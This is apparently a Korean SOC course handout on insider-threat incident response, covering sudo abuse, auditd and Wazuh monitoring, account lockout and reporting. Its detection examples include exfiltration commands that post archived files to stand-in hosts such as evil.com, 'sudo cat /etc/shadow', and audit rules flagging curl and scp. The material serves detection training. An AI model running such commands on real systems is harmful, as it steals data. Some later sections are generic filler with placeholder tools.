# Week 12: 인시던트 대응 실습 (3) - 내부 위협 (상세 버전)

## 학습 목표
- 내부 위협(Insider Threat)의 유형과 탐지 방법을 이해한다
- sudo 남용, 비인가 접근, 데이터 유출 시나리오를 분석한다
- auditd와 Wazuh를 활용한 내부 행위 모니터링을 수행한다
- 내부 위협 인시던트 대응 보고서를 작성한다
- 각 개념의 보안 관점에서의 위험과 대응 방안을 분석할 수 있다
- OpsClaw를 활용하여 실습 작업을 자동화하고 증적을 관리할 수 있다
- 실제 보안 사고 사례와 연결하여 학습 내용을 적용할 수 있다


## 실습 환경 (공통)

| 서버 | IP | 역할 | 접속 |
|------|-----|------|------|
| opsclaw | 10.20.30.201 | Control Plane (OpsClaw) | `ssh opsclaw@10.20.30.201` (pw: 1) |
| secu | 10.20.30.1 | 방화벽/IPS (nftables, Suricata) | `sshpass -p1 ssh secu@10.20.30.1` |
| web | 10.20.30.80 | 웹서버 (JuiceShop:3000, Apache:80) | `sshpass -p1 ssh web@10.20.30.80` |
| siem | 10.20.30.100 | SIEM (Wazuh:443, OpenCTI:9400) | `sshpass -p1 ssh siem@10.20.30.100` |
| dgx-spark | 192.168.0.105 | AI/GPU (Ollama:11434) | 원격 API만 |

**OpsClaw API:** `http://localhost:8000` / Key: `opsclaw-api-key-2026`


## 강의 시간 배분 (3시간)

| 시간 | 내용 | 유형 |
|------|------|------|
| 0:00-0:40 | 이론 강의 (Part 1) | 강의 |
| 0:40-1:10 | 이론 심화 + 사례 분석 (Part 2) | 강의/토론 |
| 1:10-1:20 | 휴식 | - |
| 1:20-2:00 | 실습 (Part 3) | 실습 |
| 2:00-2:40 | 심화 실습 + 도구 활용 (Part 4) | 실습 |
| 2:40-2:50 | 휴식 | - |
| 2:50-3:20 | 응용 실습 + OpsClaw 연동 (Part 5) | 실습 |
| 3:20-3:40 | 복습 퀴즈 + 과제 안내 (Part 6) | 퀴즈 |

---


---

## 용어 해설 (보안관제/SOC 과목)

| 용어 | 영문 | 설명 | 비유 |
|------|------|------|------|
| **SOC** | Security Operations Center | 보안 관제 센터 (24/7 모니터링) | 경찰 112 상황실 |
| **관제** | Monitoring/Surveillance | 보안 이벤트를 실시간 감시하는 활동 | CCTV 관제 |
| **경보** | Alert | 보안 이벤트가 탐지 규칙에 매칭되어 발생한 알림 | 화재 경보기 울림 |
| **이벤트** | Event | 시스템에서 발생한 모든 활동 기록 | 일어난 일 하나하나 |
| **인시던트** | Incident | 보안 정책을 위반한 이벤트 (실제 위협) | 실제 화재 발생 |
| **오탐** | False Positive | 정상 활동을 공격으로 잘못 탐지 | 화재 경보기가 요리 연기에 울림 |
| **미탐** | False Negative | 실제 공격을 놓침 | 도둑이 CCTV에 안 잡힘 |
| **TTD** | Time to Detect | 공격 발생~탐지까지 걸리는 시간 | 화재 발생~경보 울림 시간 |
| **TTR** | Time to Respond | 탐지~대응까지 걸리는 시간 | 경보~소방차 도착 시간 |
| **SIGMA** | SIGMA | SIEM 벤더에 무관한 범용 탐지 룰 포맷 | 국제 표준 수배서 양식 |
| **Tier 1/2/3** | SOC Tiers | 관제 인력 수준 (L1:모니터링, L2:분석, L3:전문가) | 일반의→전문의→교수 |
| **트리아지** | Triage | 경보를 우선순위별로 분류하는 작업 | 응급실 환자 분류 |
| **플레이북** | Playbook (IR) | 인시던트 유형별 대응 절차 매뉴얼 | 화재 대응 매뉴얼 |
| **포렌식** | Forensics | 사이버 범죄 수사를 위한 증거 수집·분석 | 범죄 현장 감식 |
| **IOC** | Indicator of Compromise | 침해 지표 (악성 IP, 도메인, 해시) | 수배범의 지문, 차량번호 |
| **TTP** | Tactics, Techniques, Procedures | 공격자의 전술·기법·절차 | 범인의 범행 수법 |
| **위협 헌팅** | Threat Hunting | 탐지 룰에 걸리지 않는 위협을 능동적으로 찾는 활동 | 잠복 수사 |
| **syslog** | syslog | 시스템 로그를 원격 전송하는 프로토콜 (UDP 514) | 모든 부서 보고서를 본사로 모으는 시스템 |


# 본 강의 내용

# Week 12: 인시던트 대응 실습 (3) - 내부 위협

## 학습 목표
- 내부 위협(Insider Threat)의 유형과 탐지 방법을 이해한다
- sudo 남용, 비인가 접근, 데이터 유출 시나리오를 분석한다
- auditd와 Wazuh를 활용한 내부 행위 모니터링을 수행한다
- 내부 위협 인시던트 대응 보고서를 작성한다

---

## 1. 내부 위협 개요

### 1.1 내부 위협 분류

| 유형 | 설명 | 예시 |
|------|------|------|
| 악의적 내부자 | 의도적 데이터 유출/파괴 | 퇴직 전 기밀 반출 |
| 부주의한 내부자 | 실수로 보안 위반 | 민감 파일 공개 공유 |
| 권한 남용 | 업무 범위 초과 접근 | sudo로 타인 파일 열람 |
| 계정 탈취 | 외부 공격자가 내부 계정 사용 | 피싱으로 크리덴셜 탈취 |

### 1.2 시나리오

```
시나리오: IT 관리자(user)가 sudo 권한을 남용하여
         다른 사용자 파일 열람 및 외부 전송 시도

모니터링: auditd -> Wazuh SIEM -> SOC 분석
```

---

## 2. 탐지: sudo 남용 모니터링

### 2.1 auth.log에서 sudo 사용 이력 분석

```bash
sshpass -p1 ssh -o StrictHostKeyChecking=no user@10.20.30.1 << 'ENDSSH'
echo "=== sudo 사용 이력 분석 ==="

# 전체 sudo 명령 이력
echo "--- 최근 sudo 명령 ---"
grep "sudo:" /var/log/auth.log 2>/dev/null | tail -15

echo ""
echo "--- sudo 사용 통계 ---"
grep "sudo:" /var/log/auth.log 2>/dev/null | \
  grep "COMMAND=" | \
  sed 's/.*COMMAND=//' | \
  sort | uniq -c | sort -rn | head -10

echo ""
echo "--- sudo 실패 (비인가 시도) ---"
grep -E "sudo:.*NOT in sudoers|authentication failure" /var/log/auth.log 2>/dev/null | tail -5

echo ""
echo "--- 사용자별 sudo 빈도 ---"
grep "sudo:" /var/log/auth.log 2>/dev/null | \
  grep -oP "USER=\w+" | sort | uniq -c | sort -rn
ENDSSH
```

### 2.2 auditd 규칙으로 민감 행위 감시

```bash
sshpass -p1 ssh -o StrictHostKeyChecking=no user@10.20.30.1 << 'ENDSSH'
echo "=== auditd 규칙 확인 ==="

# 현재 audit 규칙 확인
echo "1" | sudo -S auditctl -l 2>/dev/null || echo "auditd 미설치 또는 비활성"

echo ""
echo "--- 권장 audit 규칙 (내부 위협 탐지) ---"
cat << 'RULES'
# 민감 파일 접근 감시
-w /etc/passwd -p wa -k identity_change
-w /etc/shadow -p wa -k identity_change
-w /etc/sudoers -p wa -k sudo_change

# sudo 설정 변경 감시
-w /etc/sudoers.d/ -p wa -k sudo_change

# 대량 파일 복사/이동
-a always,exit -F arch=b64 -S rename,renameat -k file_move
-w /usr/bin/scp -p x -k data_exfil
-w /usr/bin/rsync -p x -k data_exfil
-w /usr/bin/curl -p x -k data_exfil

# 계정 생성/삭제
-w /usr/sbin/useradd -p x -k account_change
-w /usr/sbin/userdel -p x -k account_change
RULES
ENDSSH
```

### 2.3 Wazuh에서 내부 위협 경보

```bash
sshpass -p1 ssh -o StrictHostKeyChecking=no user@10.20.30.100 << 'ENDSSH'
echo "=== Wazuh 내부 위협 관련 경보 ==="

cat /var/ossec/logs/alerts/alerts.json 2>/dev/null | python3 -c "
import sys, json
sudo_alerts = []
for line in sys.stdin:
    try:
        a = json.loads(line.strip())
        desc = a.get('rule',{}).get('description','').lower()
        full_log = a.get('full_log','').lower()
        if 'sudo' in desc or 'sudo' in full_log or 'privilege' in desc:
            sudo_alerts.append(a)
    except: pass

print(f'sudo/권한 관련 경보: {len(sudo_alerts)}건')
for a in sudo_alerts[-10:]:
    rule = a.get('rule',{})
    ts = a.get('timestamp','')
    agent = a.get('agent',{}).get('name','')
    print(f'  [{rule.get(\"level\",0)}] {ts[:19]} ({agent}) {rule.get(\"description\",\"\")[:60]}')
" 2>/dev/null || echo "경보 데이터 접근 불가"
ENDSSH
```

---

## 3. 분석: 내부 위협 시나리오 재현

### 3.1 시나리오 1 - sudo를 이용한 파일 열람

```bash
sshpass -p1 ssh -o StrictHostKeyChecking=no user@10.20.30.1 << 'ENDSSH'
echo "=== 시나리오 1: sudo 파일 열람 시뮬레이션 ==="

echo "--- Step 1: 다른 사용자 디렉토리 접근 시도 ---"
ls /root/ 2>&1 | head -3
echo "(일반 사용자로는 접근 불가)"

echo ""
echo "--- Step 2: sudo로 접근 (권한 남용) ---"
echo "1" | sudo -S ls /root/ 2>/dev/null | head -5

echo ""
echo "--- Step 3: 접근 로그 확인 ---"
grep "sudo.*COMMAND.*ls.*root" /var/log/auth.log 2>/dev/null | tail -3

echo ""
echo "=== 탐지 포인트 ==="
echo "1. auth.log에 sudo COMMAND 기록"
echo "2. auditd에서 /root 접근 기록"
echo "3. Wazuh rule 5402 (sudo 명령 실행) 경보"
ENDSSH
```

### 3.2 시나리오 2 - 데이터 유출 시도 패턴

```bash
sshpass -p1 ssh -o StrictHostKeyChecking=no user@10.20.30.1 << 'ENDSSH'
python3 << 'PYEOF'
exfil_indicators = [
    {
        "pattern": "대량 파일 압축",
        "commands": ["tar czf /tmp/backup.tar.gz /etc/", "zip -r /tmp/data.zip /var/log/"],
        "detection": "auditd: tar/zip 실행 감시, 파일 크기 모니터링",
    },
    {
        "pattern": "외부 전송",
        "commands": ["scp /tmp/data.zip user@external:/", "curl -F file=@/tmp/data.zip http://evil.com/"],
        "detection": "auditd: scp/curl 실행 감시, DLP 솔루션",
    },
    {
        "pattern": "DNS 터널링",
        "commands": ["dnscat2", "iodine"],
        "detection": "Suricata: 비정상 DNS 쿼리 탐지, DNS 쿼리 길이/빈도",
    },
    {
        "pattern": "USB 복사",
        "commands": ["mount /dev/sdb1 /mnt", "cp -r /data /mnt/"],
        "detection": "udev 규칙, auditd: mount 감시",
    },
]

print(f"{'패턴':<20} {'탐지 방법'}")
print("=" * 70)
for ind in exfil_indicators:
    print(f"\n{ind['pattern']}")
    for cmd in ind['commands']:
        print(f"  명령: {cmd}")
    print(f"  탐지: {ind['detection']}")
PYEOF
ENDSSH
```

### 3.3 UEBA 스타일 행위 이상 탐지

```bash
sshpass -p1 ssh -o StrictHostKeyChecking=no user@10.20.30.1 << 'ENDSSH'
python3 << 'PYEOF'
user_activities = [
    {"time": "09:00", "action": "login", "detail": "SSH 로그인"},
    {"time": "09:05", "action": "command", "detail": "ls, cd (일반 작업)"},
    {"time": "09:30", "action": "command", "detail": "vim config.yaml"},
    {"time": "14:00", "action": "sudo", "detail": "sudo cat /etc/shadow"},
    {"time": "14:01", "action": "sudo", "detail": "sudo ls /root/"},
    {"time": "14:02", "action": "command", "detail": "tar czf /tmp/data.tar.gz /root/"},
    {"time": "14:03", "action": "command", "detail": "curl -X POST http://ext.example.com -F f=@/tmp/data.tar.gz"},
    {"time": "14:05", "action": "command", "detail": "rm /tmp/data.tar.gz"},
    {"time": "17:00", "action": "logout", "detail": "정상 퇴근"},
]

print("시간   행위        상세                                           판정")
print("=" * 85)
for act in user_activities:
    anomaly = False
    reason = ""
    if "shadow" in act["detail"]: anomaly, reason = True, "민감 파일 접근"
    elif "/root/" in act["detail"] and "sudo" in act["action"]: anomaly, reason = True, "타 사용자 디렉토리"
    elif "tar" in act["detail"] and "/root" in act["detail"]: anomaly, reason = True, "대량 데이터 수집"
    elif "curl" in act["detail"] and "ext" in act["detail"]: anomaly, reason = True, "외부 전송 시도"
    elif act["detail"].startswith("rm") and "tmp" in act["detail"]: anomaly, reason = True, "증거 인멸 의심"

    flag = f"[ANOMALY] {reason}" if anomaly else "[NORMAL]"
    print(f"{act['time']}  {act['action']:<10}  {act['detail']:<45} {flag}")
PYEOF
ENDSSH
```

---

## 4. 대응 (Response)

### 4.1 계정 비활성화 절차

```bash
sshpass -p1 ssh -o StrictHostKeyChecking=no user@10.20.30.1 << 'ENDSSH'
echo "=== 계정 비활성화 절차 (교육용) ==="

cat << 'PROCEDURE'
내부 위협 확인 시 즉시 대응 절차:

1. 계정 비활성화
   $ sudo usermod -L [username]
   $ sudo chage -E 0 [username]

2. 활성 세션 강제 종료
   $ sudo pkill -u [username]

3. SSH 키 비활성화
   $ sudo mv /home/[user]/.ssh/authorized_keys /home/[user]/.ssh/authorized_keys.disabled

4. sudo 권한 제거
   $ sudo deluser [username] sudo

5. 증거 보전
   $ sudo cp -rp /home/[username]/ /evidence/$(date +%Y%m%d)/
   $ sudo cp /var/log/auth.log /evidence/$(date +%Y%m%d)/
   $ sudo journalctl _UID=[uid] > /evidence/$(date +%Y%m%d)/journal.log
PROCEDURE

echo ""
echo "--- 현재 활성 사용자 ---"
who 2>/dev/null
echo ""
echo "--- sudo 그룹 ---"
getent group sudo 2>/dev/null
ENDSSH
```

### 4.2 Wazuh Active Response 설정

```bash
sshpass -p1 ssh -o StrictHostKeyChecking=no user@10.20.30.100 << 'ENDSSH'
echo "=== Wazuh Active Response 설정 예시 ==="

cat << 'CONFIG'
<!-- ossec.conf Active Response -->
<active-response>
  <command>firewall-drop</command>
  <location>local</location>
  <rules_id>5402,5403</rules_id>
  <timeout>3600</timeout>
</active-response>

<active-response>
  <command>firewall-drop</command>
  <location>local</location>
  <rules_id>5710,5712</rules_id>
  <timeout>1800</timeout>
</active-response>
CONFIG

echo ""
echo "--- Active Response 바이너리 ---"
ls -la /var/ossec/active-response/bin/ 2>/dev/null | head -10
ENDSSH
```

---

## 5. 보고서 작성

### 5.1 LLM 보고서 자동 생성

```bash
curl -s http://192.168.0.105:11434/v1/chat/completions \
  -H "Content-Type: application/json" \
  -d '{
    "model": "gemma3:12b",
    "messages": [
      {"role": "system", "content": "SOC 인시던트 대응 보고서 작성 전문가입니다. 한국어로 전문적인 보고서를 작성합니다."},
      {"role": "user", "content": "다음 내부 위협 인시던트 보고서를 작성하세요:\n\n사건: IT 관리자가 sudo로 /etc/shadow, /root/ 접근 후 tar로 수집, curl로 외부 전송 시도, 증거 삭제\n탐지: auth.log sudo 이력 -> Wazuh 경보 -> SOC\n대응: 계정 잠금, sudo 제거, 세션 종료\n\n1) 타임라인 2) ATT&CK 매핑 3) 재발 방지 권고"}
    ],
    "temperature": 0.3
  }' | python3 -c "import json,sys; print(json.load(sys.stdin)['choices'][0]['message']['content'])"
```

---

## 6. 내부 위협 방지 체계

### 6.1 예방적 통제

```bash
sshpass -p1 ssh -o StrictHostKeyChecking=no user@10.20.30.80 << 'ENDSSH'
python3 << 'PYEOF'
controls = {
    "기술적 통제": [
        ("최소 권한 원칙", "필요 최소한의 sudo 명령만 허용"),
        ("DLP", "민감 데이터 외부 전송 차단"),
        ("UEBA", "사용자 행위 이상 탐지"),
        ("네트워크 세분화", "내부 네트워크 접근 제한"),
        ("MFA", "중요 시스템 다중 인증"),
    ],
    "관리적 통제": [
        ("접근 리뷰", "분기별 권한 점검"),
        ("퇴직자 절차", "즉시 계정 비활성화"),
        ("보안 교육", "내부 위협 인식 교육"),
        ("감사 로그", "모든 관리자 행위 기록"),
    ],
    "탐지적 통제": [
        ("로그 모니터링", "sudo, SSH, 파일 접근 실시간 감시"),
        ("경보 규칙", "비정상 시간대/패턴 경보"),
        ("정기 감사", "월별 관리자 행위 감사"),
    ],
}

for category, items in controls.items():
    print(f"\n{category}")
    print("=" * 50)
    for name, desc in items:
        print(f"  - {name}: {desc}")
PYEOF
ENDSSH
```

---

## 핵심 정리

1. 내부 위협은 악의적 내부자, 부주의, 권한 남용, 계정 탈취로 분류된다
2. auth.log와 auditd는 내부 행위 모니터링의 핵심 데이터 소스다
3. UEBA 관점에서 사용자 행위 패턴 이상을 탐지해야 한다
4. 내부 위협 확인 시 계정 잠금, 세션 종료, 증거 보전 순서로 대응한다
5. 최소 권한 원칙과 정기 접근 리뷰가 예방의 핵심이다
6. 기술적 + 관리적 + 탐지적 통제를 조합해야 효과적이다

---

## 다음 주 예고
- Week 13: 위협 인텔리전스(CTI) 활용 - OpenCTI 연동, IOC 조회, 위협 헌팅


---

## 심화 학습: 개념 확장

### 핵심 개념 상세 해설

이 주차에서 다루는 핵심 개념들을 더 깊이 살펴본다.

#### 개념 1: 동작 원리 (Course 5)

이 주차에서 다루는 기술의 동작 방식을 단계별로 분해하여 이해한다.

```
[1단계] 입력/요청 → 시스템이 데이터를 수신
[2단계] 처리 → 내부 로직에 의한 데이터 처리
[3단계] 출력/응답 → 결과 반환 또는 상태 변경
[4단계] 기록 → 로그/증적 생성
```

> **왜 이 순서가 중요한가?**
> 각 단계에서 보안 검증이 누락되면 취약점이 발생한다.
> 1단계: 입력값 검증 미흡 → Injection
> 2단계: 인가 확인 누락 → Broken Access Control
> 3단계: 에러 정보 노출 → Information Disclosure
> 4단계: 로깅 실패 → Monitoring Failures

#### 개념 2: 보안 관점에서의 위험 분석

| 위험 요소 | 발생 조건 | 영향도 | 대응 방안 |
|----------|---------|--------|---------|
| 설정 미흡 | 기본 설정 사용 | 높음 | 보안 하드닝 가이드 적용 |
| 패치 누락 | 업데이트 미적용 | 높음 | 정기 패치 관리 프로세스 |
| 접근 제어 부재 | 인증/인가 미구현 | 매우 높음 | RBAC, MFA 적용 |
| 로깅 미흡 | 감사 로그 미수집 | 중간 | SIEM 연동, 로그 정책 |

#### 개념 3: 실제 사례 분석

**사례 1: 유사 취약점이 실제 피해로 이어진 경우**

실제 보안 사고에서 이 주차의 주제가 어떻게 악용되었는지 살펴본다.
공격자는 동일한 기법을 사용하여 대규모 데이터 유출, 서비스 장애, 금전적 피해를 초래하였다.

**교훈:**
- 기본적인 보안 조치의 중요성
- 탐지 체계의 필수성
- 사고 대응 절차의 사전 수립 필요성

### 도구 비교표

| 도구 | 용도 | 장점 | 단점 | 라이선스 |
|------|------|------|------|---------|
| 도구 A | 기본 점검 | 간편, 빠름 | 기능 제한 | 오픈소스 |
| 도구 B | 심층 분석 | 상세 결과 | 학습 곡선 | 상용/무료 |
| 도구 C | 자동화 | CI/CD 연동 | 오탐 가능 | 오픈소스 |


---

## 보충 실습

### 보충 실습 1: 기본 동작 확인

이론에서 배운 내용을 직접 확인하는 기초 실습이다.

```bash
# Step 1: 현재 상태 확인
echo "=== 현재 상태 ==="
# (해당 주차에 맞는 확인 명령)

# Step 2: 설정/변경 적용
echo "=== 변경 적용 ==="
# (해당 주차에 맞는 실습 명령)

# Step 3: 결과 검증
echo "=== 결과 확인 ==="
# (변경 결과 확인 명령)
```

> **트러블슈팅:**
> - 명령이 실패하면: 권한(sudo), 경로, 서비스 상태를 먼저 확인
> - 예상과 다른 결과: 이전 실습의 설정이 남아있을 수 있으므로 초기화 후 재시도
> - 타임아웃: 네트워크 연결 또는 서비스 가동 상태 확인

### 보충 실습 2: 탐지/모니터링 관점

공격자가 아닌 **방어자 관점**에서 동일한 활동을 모니터링하는 실습이다.

```bash
# siem 서버에서 관련 로그 확인
sshpass -p1 ssh -o StrictHostKeyChecking=no siem@10.20.30.100 \
  "sudo cat /var/ossec/logs/alerts/alerts.json | tail -5" 2>/dev/null

# Suricata 알림 확인 (해당 시)
sshpass -p1 ssh -o StrictHostKeyChecking=no secu@10.20.30.1 \
  "sudo tail -20 /var/log/suricata/fast.log" 2>/dev/null
```

> **왜 방어자 관점도 배우는가?**
> 공격 기법만 알면 "스크립트 키디"에 불과하다.
> 공격이 어떻게 탐지되는지 이해해야 진정한 보안 전문가이다.
> 이 과목의 모든 공격 실습에는 대응하는 탐지/방어 관점이 포함된다.

### 보충 실습 3: OpsClaw 자동화

이번 주차의 핵심 실습을 OpsClaw execute-plan으로 자동화한다.

```bash
# 프로젝트 생성 (이번 주차용)
RESULT=$(curl -s -X POST http://localhost:8000/projects \
  -H "Content-Type: application/json" \
  -H "X-API-Key: opsclaw-api-key-2026" \
  -d '{"name":"weekXX-lab","request_text":"이번 주차 실습 자동화","master_mode":"external"}')
PID=$(echo $RESULT | python3 -c "import sys,json; print(json.load(sys.stdin)['project']['id'])")

# Stage 전환
curl -s -X POST "http://localhost:8000/projects/$PID/plan" -H "X-API-Key: opsclaw-api-key-2026" > /dev/null
curl -s -X POST "http://localhost:8000/projects/$PID/execute" -H "X-API-Key: opsclaw-api-key-2026" > /dev/null

# 실습 태스크 실행 (해당 주차에 맞게 수정)
curl -s -X POST "http://localhost:8000/projects/$PID/execute-plan" \
  -H "Content-Type: application/json" \
  -H "X-API-Key: opsclaw-api-key-2026" \
  -d '{
    "tasks": [
      {"order":1,"title":"실습 태스크 1","instruction_prompt":"echo 실습1","risk_level":"low","subagent_url":"http://localhost:8002"},
      {"order":2,"title":"실습 태스크 2","instruction_prompt":"echo 실습2","risk_level":"low","subagent_url":"http://10.20.30.80:8002"}
    ],
    "subagent_url":"http://localhost:8002",
    "parallel":true
  }'

# Evidence 확인
curl -s "http://localhost:8000/projects/$PID/evidence/summary" \
  -H "X-API-Key: opsclaw-api-key-2026" | python3 -m json.tool
```


---

## 자가 점검 퀴즈 (10문항)

이번 주차의 핵심 내용을 점검한다. 8/10 이상 정답을 목표로 한다.

**Q1.** 이번 주차 "Week 12: 인시던트 대응 실습 (3) - 내부 위협"의 핵심 목적은 무엇인가?
- (a) 네트워크 속도 향상  (b) **보안관제 기법/개념의 이해와 실습**  (c) 데이터베이스 관리  (d) UI 디자인

**Q2.** 이 주제에서 로그 분석의 역할은?
- (a) 성능 최적화  (b) 비용 절감  (c) **체계적 분류와 대응 기준 제공**  (d) 사용자 편의

**Q3.** 실습에서 사용한 주요 도구/명령어의 1차 목적은?
- (a) 파일 복사  (b) **인시던트 대응 수행 및 결과 확인**  (c) 메모리 관리  (d) 화면 출력

**Q4.** OpsClaw를 통해 실습을 실행하는 가장 큰 이점은?
- (a) 속도  (b) **모든 실행의 자동 증적(evidence) 기록**  (c) 무료  (d) 간편함

**Q5.** 이 주제의 보안 위험이 높은 이유는?
- (a) 비용이 많이 들어서  (b) 복잡해서  (c) **악용 시 시스템/데이터에 직접적 피해**  (d) 법적 문제

**Q6.** 방어/대응의 핵심 원칙은?
- (a) 모든 트래픽 차단  (b) **최소 권한 + 탐지 + 대응의 조합**  (c) 서버 재시작  (d) 비밀번호 변경

**Q7.** 실습 결과를 분석할 때 가장 먼저 확인해야 하는 것은?
- (a) 서버 이름  (b) **exit_code (성공/실패 여부)**  (c) 파일 크기  (d) 날짜

**Q8.** 이 주제와 관련된 MITRE ATT&CK 전술은?
- (a) Impact만  (b) Reconnaissance만  (c) **주제에 해당하는 전술(들)**  (d) 해당 없음

**Q9.** 실무에서 이 기법/도구를 사용할 때 가장 주의할 점은?
- (a) 속도  (b) **법적 허가와 범위 준수**  (c) 비용  (d) 보고서 양식

**Q10.** 다음 주차와의 연결 포인트는?
- (a) 관련 없음  (b) **이번 주 결과를 다음 주에서 활용/심화**  (c) 완전히 다른 주제  (d) 복습만

**정답:** Q1:b, Q2:c, Q3:b, Q4:b, Q5:c, Q6:b, Q7:b, Q8:c, Q9:b, Q10:b

---

## 과제 (다음 주까지)

### 과제 1: 이론 정리 보고서 (30점)

이번 주차의 핵심 개념을 자신의 말로 정리하라.

| 항목 | 배점 |
|------|------|
| 핵심 개념 정의 및 설명 | 10점 |
| 실습 결과 캡처 및 해석 | 10점 |
| 보안 관점 분석 (공격↔방어) | 10점 |

### 과제 2: 실습 수행 보고서 (40점)

이번 주차의 모든 실습을 수행하고 결과를 보고서로 작성하라.

| 항목 | 배점 |
|------|------|
| 실습 명령어 및 실행 결과 캡처 | 15점 |
| 결과 해석 및 보안 의미 분석 | 15점 |
| 트러블슈팅 경험 (있는 경우) | 10점 |

### 과제 3: OpsClaw 자동화 (30점)

이번 주차의 핵심 실습을 OpsClaw execute-plan으로 자동화하라.

| 항목 | 배점 |
|------|------|
| 프로젝트 생성 + stage 전환 | 5점 |
| execute-plan 태스크 설계 (3개 이상) | 10점 |
| evidence/summary 결과 | 5점 |
| replay 타임라인 결과 | 5점 |
| 자동화의 이점 분석 (직접 실행 대비) | 5점 |

**제출:** 보고서(PDF 또는 MD) + OpsClaw project_id


---

## 검증 체크리스트

이번 주차의 학습을 완료하려면 다음 항목을 모두 확인하라:

- [ ] 이론 강의 내용 이해 (핵심 용어 설명 가능)
- [ ] 기본 실습 모두 수행 완료
- [ ] 보충 실습 1 (기본 동작 확인) 완료
- [ ] 보충 실습 2 (탐지/모니터링 관점) 수행
- [ ] 보충 실습 3 (OpsClaw 자동화) 수행
- [ ] 자가 점검 퀴즈 8/10 이상 정답
- [ ] 과제 1 (이론 정리) 작성
- [ ] 과제 2 (실습 보고서) 작성
- [ ] 과제 3 (OpsClaw 자동화) 완료

